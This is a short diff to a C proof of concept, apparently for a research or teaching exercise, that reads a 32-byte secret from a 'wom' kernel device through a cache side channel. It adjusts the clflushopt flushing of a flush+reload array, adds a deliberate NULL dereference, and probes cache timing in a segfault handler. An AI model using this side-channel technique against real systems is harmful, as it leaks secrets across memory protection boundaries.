@@ -27,7 +27,7 @@ wom_get_address(int fd) {
 	return addr;
 }
 
-#define NB_MEASUREMENTS 5000
+#define NB_MEASUREMENTS 256 * 5
 #define CACHELINE_SIZE 4096
 #define SIZE_SECRET 32 //bytes
 
@@ -138,9 +138,9 @@ int main(int argc, char *argv[]) {
 	secret = wom_get_address(fd);
 
 	//flush the flush_reload array
-	for (size_t j = 0; j < 256; j++)
+	for (size_t j = 0; j < 256 * CACHELINE_SIZE; j += 64)
 		asm volatile("clflushopt (%0)\n\t" ::
-		                 "r"(&flush_reload[j * CACHELINE_SIZE]));
+		                 "r"(&flush_reload[j]));
 
 	for (size_t i = 0; i < SIZE_SECRET; i++) {
 
@@ -167,6 +167,7 @@ int main(int argc, char *argv[]) {
 			read(fd, dummy, 1);
 			asm volatile("movb %0, %%al\n\t" ::"r"(dummy)
 			             : "memory", "%al");
+			*(volatile char *)NULL;
 
 			//forbidden access, probe cache in the segfault handler, as data is loaded in L1d one access will be faster
 			asm volatile("xor %%rax, %%rax\n\t"
